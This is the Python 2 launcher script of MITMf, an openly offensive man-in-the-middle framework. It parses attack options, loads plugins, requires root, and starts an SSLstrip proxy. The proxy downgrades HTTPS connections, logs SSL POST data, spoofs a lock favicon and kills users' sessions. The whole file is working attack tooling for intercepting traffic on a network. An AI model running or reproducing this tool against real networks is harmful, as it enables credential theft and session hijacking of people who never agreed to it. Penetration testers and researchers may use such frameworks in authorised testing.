#!/usr/bin/env python2.7

from twisted.web import http
from twisted.internet import reactor

from libs.sslstrip.CookieCleaner import CookieCleaner
from libs.sergioproxy.ProxyPlugins import ProxyPlugins
from libs.banners import get_banner

import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import get_if_addr, get_if_hwaddr

from configobj import ConfigObj

from plugins import *
plugin_classes = plugin.Plugin.__subclasses__()

import sys
import argparse
import os

try:
    import user_agents
except:
    print "[-] user_agents library missing! User-Agent parsing will be disabled!"

mitmf_version = "0.9.5"
sslstrip_version = "0.9"
sergio_version = "0.2.1"

banner = get_banner()
print banner

parser = argparse.ArgumentParser(description="MITMf v%s - Framework for MITM attacks" % mitmf_version, version=mitmf_version, usage='', epilog="Use wisely, young Padawan.",fromfile_prefix_chars='@')
#add MITMf options
mgroup = parser.add_argument_group("MITMf", "Options for MITMf")
mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
mgroup.add_argument("-i", "--interface", required=True, type=str,  metavar="interface" ,help="Interface to listen on")
mgroup.add_argument("-c", "--config-file", dest='configfile', type=str, default="./config/mitmf.cfg", metavar='configfile', help="Specify config file to use")
mgroup.add_argument('-d', '--disable-proxy', dest='disproxy', action='store_true', default=False, help='Only run plugins, disable all proxies')
#add sslstrip options
sgroup = parser.add_argument_group("SSLstrip", "Options for SSLstrip library")
#sgroup.add_argument("-w", "--write", type=argparse.FileType('w'), metavar="filename", default=sys.stdout, help="Specify file to log to (stdout by default).")
slogopts = sgroup.add_mutually_exclusive_group()
slogopts.add_argument("-p", "--post", action="store_true",help="Log only SSL POSTs. (default)")
slogopts.add_argument("-s", "--ssl", action="store_true", help="Log all SSL traffic to and from server.")
slogopts.add_argument("-a", "--all", action="store_true", help="Log all SSL and HTTP traffic to and from server.")
#slogopts.add_argument("-c", "--clients", action='store_true', default=False, help='Log each clients data in a seperate file') #not fully tested yet
sgroup.add_argument("-l", "--listen", type=int, metavar="port", default=10000, help="Port to listen on (default 10000)")
sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")

#Initialize plugins
plugins = []
try:
    for p in plugin_classes:
        plugins.append(p())
except:
    print "Failed to load plugin class %s" % str(p)

#Give subgroup to each plugin with options
try:
    for p in plugins:
        if p.desc == "":
            sgroup = parser.add_argument_group("%s" % p.name,"Options for %s." % p.name)
        else:
            sgroup = parser.add_argument_group("%s" % p.name, p.desc)

        sgroup.add_argument("--%s" % p.optname, action="store_true",help="Load plugin %s" % p.name)

        if p.has_opts:
            p.add_options(sgroup)
except NotImplementedError:
    sys.exit("[-] %s plugin claimed option support, but didn't have it." % p.name)

args = parser.parse_args()

try:
    configfile = ConfigObj(args.configfile)
except Exception, e:
    sys.exit("[-] Error parsing config file: " + str(e))

config_args = configfile['MITMf']['args']
if config_args:
    print "[*] Loading arguments from config file"
    for arg in config_args.split(' '):
        sys.argv.append(arg)
    args = parser.parse_args()

#Check to see if called plugins require elevated privs
try:
    for p in plugins:
        if (vars(args)[p.optname] is True) and (p.req_root is True):
           if os.geteuid() != 0:
                sys.exit("[-] %s plugin requires root privileges" % p.name)
except AttributeError:
    sys.exit("[-] %s plugin is missing the req_root attribute" % p.name)

####################################################################################################

# Here we check for some variables that are very commonly used, and pass them down to the plugins
try:
    args.ip_address = get_if_addr(args.interface)
    if (args.ip_address == "0.0.0.0") or (args.ip_address is None):
        sys.exit("[-] Interface %s does not have an assigned IP address" % args.interface)
except Exception, e:
    sys.exit("[-] Error retrieving interface IP address: %s" % e)

try:
    args.mac_address = get_if_hwaddr(args.interface)
except Exception, e:
    sys.exit("[-] Error retrieving interface MAC address: %s" % e)

args.configfile = configfile #so we can pass the configobj down to all the plugins

####################################################################################################

log_level = logging.__dict__[args.log_level.upper()]

#Start logging 
logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logFormatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
rootLogger = logging.getLogger()

fileHandler = logging.FileHandler("./logs/mitmf.log")
fileHandler.setFormatter(logFormatter)
rootLogger.addHandler(fileHandler)

#####################################################################################################

#All our options should be loaded now, pass them onto plugins
print "[*] MITMf v%s online... initializing plugins" % mitmf_version

load = []

for p in plugins:
    try:
        if vars(args)[p.optname] is True:
            print "|_ %s v%s" % (p.name, p.version)

        if getattr(args, p.optname):
            p.initialize(args)
            load.append(p)
    except Exception, e:
        print "[-] Error loading plugin: " + str(e) 

#Plugins are ready to go, start MITMf
if args.disproxy:
    ProxyPlugins.getInstance().setPlugins(load)
else:
    
    from libs.sslstrip.StrippingProxy import StrippingProxy
    from libs.sslstrip.URLMonitor import URLMonitor

    URLMonitor.getInstance().setFaviconSpoofing(args.favicon)
    CookieCleaner.getInstance().setEnabled(args.killsessions)
    ProxyPlugins.getInstance().setPlugins(load)

    strippingFactory              = http.HTTPFactory(timeout=10)
    strippingFactory.protocol     = StrippingProxy

    reactor.listenTCP(args.listen, strippingFactory)

    #load custom reactor options for plugins that have the 'plugin_reactor' attribute
    for p in plugins:
        if getattr(args, p.optname):
            if hasattr(p, 'plugin_reactor'):
                p.plugin_reactor(strippingFactory) #we pass the default strippingFactory, so the plugins can use it

    print "|"
    print "|_ Sergio-Proxy v%s online" % sergio_version
    print "|_ SSLstrip v%s by Moxie Marlinspike running..." % sslstrip_version

reactor.run()

#run each plugins finish() on exit
for p in load:
    p.finish()